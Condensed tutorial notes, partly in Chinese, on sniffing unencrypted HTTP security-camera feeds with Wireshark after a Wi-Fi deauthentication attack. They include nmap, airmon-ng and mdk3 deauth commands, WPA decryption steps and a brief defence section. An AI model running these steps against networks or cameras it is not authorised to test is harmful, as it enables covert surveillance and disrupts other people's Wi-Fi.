## Intercept Images from a Security Camera Using Wireshark

### IoT Devices & Administration Pages

### Ports 80 & 81 Are Insecure

- 在路由器，安全摄像头和其他支持 Wi-Fi 的物联网设备等设备上看到端口 80, 81, 8080 或 8081 开放时，这很可能意味着在该端口上托管了一个不安全的HTTP网站
- 虽然端口 443 用于安全 HTTPS 流量，它是加密的并且不会出现相同类型的拦截风险，但任何通过本地网络暴露不安全 HTTP 端口的连接设备都是有被入侵的风险。例如使用 [RouterSploit](https://null-byte.wonderhowto.com/how-to/seize-control-router-with-routersploit-0177774/) 这样的程序尝试入侵

### Intercepting Traffic with Wireshark

- 使用 Wireshark 来嗅探目标计算机和路由器之间的 Wi-Fi 流量，目标是在查看安全摄像头源时捕获流向目标计算机的未加密 HTTP 流量
- 将 Wi-Fi 密钥添加到 Wireshark，无需连接到网络就可以解密我们嗅探的数据，降低被发现的几率

### What You'll Need & Practical Limitations

1. Access the Web Camera on the Insecure Interface

   `sudo nmap -p 80,81,8080,8081 192.168.0.0/24`

2. Identify the Channel & Prepare Wireless Card

   `airmon-ng start wlan0`

   `airodump-ng wlan0mon`

   `airmon-ng start wlan0mon 11`

3. Start Wireshark

4. Add the Network Password to Decrypt Traffic

   “Edit”->“Preferences”->“Protocols”->“IEEE 802.11”->“Enable decryption”->”Edit”->“``wpa-pwd`; key: `password:networkname`”

5. Build a Filter to Capture Traffic Between Devices

   “Receiver address”->“Apply as Filter”->“Selected”

6. Deauth the Target to Grab a Handshake

   `mdk3 wlan0mon d -c 11`

   `airodump-ng wlan0mon -c 11`

7. Filter the Traffic to Find HTTP Traffic

   `http`

8. Decode, Export & View the Intercepted JPEGs

   “File”->“Export Objects”->“HTTP”->“Save”

### Defending Against the Attack

- 确保摄像头使用 HTTPS 传输，设置高强度密码
- 避免直接暴露在互联网上
- 禁用路由器上的 WPS 设置等其他安全功能的选项



[原文](https://null-byte.wonderhowto.com/how-to/intercept-images-from-security-camera-using-wireshark-0191735/#jump-step8)

